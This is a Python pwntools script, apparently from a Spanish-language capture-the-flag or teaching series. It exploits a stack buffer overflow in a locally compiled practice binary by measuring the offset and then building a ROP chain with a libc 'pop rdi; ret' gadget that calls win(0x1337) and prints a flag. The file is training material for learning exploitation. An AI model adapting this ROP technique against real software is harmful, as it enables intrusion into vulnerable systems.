#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""B3 - ret2win con argumento: win(int) exige 0x1337 en RDI.
FASE 1: offset ciclico. FASE 2: salto ingenuo a win() SIN argumento
(muestra el valor basura de RDI). FASE 3: gadget 'pop rdi; ret' de libc
carga 0x1337 y win() canta la flag. TODO dinamico.
USO: python3 b3_ret2win_arg.py"""
from pwn import *
import os
import re
import subprocess

context.arch = 'amd64'
context.log_level = 'info'

BIN = './b3_ret2win_arg'
FLAG_B3 = b'FLAG{ROP_B3_pop_rdi_0x1337}'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'b3_ret2win_arg.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

elf = ELF(BIN, checksec=False)
win = elf.symbols['win']
log.info('win() @ %#x (ejemplo; la tuya sera distinta)', win)

# base de libc via ldd con ASLR fuera (mismo metodo que B2)
ARCH = os.uname().machine
ldd_out = subprocess.run(
    ['setarch', ARCH, '-R', 'ldd', BIN],
    capture_output=True, text=True).stdout
m = re.search(r'libc\.so\.6 => (\S+) \(0x([0-9a-f]+)\)', ldd_out)
libc_path, libc_base = m.group(1), int(m.group(2), 16)
libc = ELF(libc_path, checksec=False)
libc.address = libc_base
pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret'])[0]
log.info('libc base %#x | pop rdi; ret @ %#x (libc)', libc_base, pop_rdi)

# gadget 'ret' suelto del binario: alineacion (leccion B1)
ret_gadget = ROP(elf).find_gadget(['ret'])[0]

# ------------------------------------------------------------------
# FASE 1 - offset dinamico: patron ciclico + corefile (metodo A2)
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])   # misma via que ldd
io.recvuntil(b'exige 0x1337 en RDI')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))   # x86_64: leer desde $rsp
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - control: saltar a win() SIN preparar RDI
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])   # ASLR fuera, como el ldd
io.recvuntil(b'exige 0x1337 en RDI')
io.sendline(b'A' * offset + p64(ret_gadget) + p64(win))
salida = io.recvall(timeout=3)
io.close()
if b'INCORRECTA' in salida:
    log.info('FASE 2: win() se ejecuto con RDI basura (System V exige '
             'el 1er argumento en RDI).')
else:
    log.info('FASE 2: sin crash pero revisa la salida de win().')

# ------------------------------------------------------------------
# FASE 3 - exploit real: padding + [pop_rdi, 0x1337, ret, win]
#   pop rdi -> rdi = 0x1337 ; ret -> re-alinea ; win(0x1337) -> flag
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])   # ASLR fuera, como el ldd
io.recvuntil(b'exige 0x1337 en RDI')
payload = b'A' * offset + p64(pop_rdi) + p64(0x1337) + p64(ret_gadget) + p64(win)
assert b'\n' not in payload, 'gets() cortaria el payload en el primer 0x0a'
io.sendline(payload)
salida = io.recvall(timeout=3)
io.close()

if FLAG_B3 in salida:
    log.success('B3 SUPERADO: pop rdi; ret cargo 0x1337 en RDI y '
                'win(0x1337) entrego la flag.')
else:
    log.failure('B3: sin flag. Pistas: gadget pop rdi de libc, valor '
                '0x1337 y el ret de alineacion de B1.')
